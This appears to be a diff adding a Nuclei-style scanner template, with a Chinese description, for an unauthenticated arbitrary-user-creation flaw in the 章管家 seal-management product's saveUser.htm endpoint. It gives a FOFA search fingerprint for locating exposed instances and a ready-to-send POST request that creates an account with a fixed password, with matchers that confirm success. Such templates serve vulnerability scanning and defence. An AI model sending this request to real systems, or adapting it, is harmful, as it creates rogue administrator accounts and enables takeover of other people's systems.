@@ -1,0 +1,36 @@
+id: zhangguanjia-saveUser-User-addition
+
+info:
+  name: 章管家 saveUser.htm 任意用户创建漏洞
+  author: unknown
+  severity: high
+  description: |-
+    fofa: body="章管家登录-公章在外防私盖"
+    章管家 /api/personSeal_jdy/saveUser.htm 接口处存在任意用户创建漏洞，未经身份验证的远程攻击者可以利用此漏洞创建管理员账户，从而接管系统后台，造成信息泄露，导致系统处于极不安全的状态。
+
+  tags: User addition
+
+http:
+  - raw:
+      - |
+        POST /api/personSeal_jdy/saveUser.htm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"op":{},"data":{"mobile":"test666","uid":"14333333333","password":"123456","name":"test666","return_url":"https://www.baidu.com","apisecretkey":"1","_id":"1","mail_address":"123@qq.com"},"b7o4ntosbfp":"="}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"code":200'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
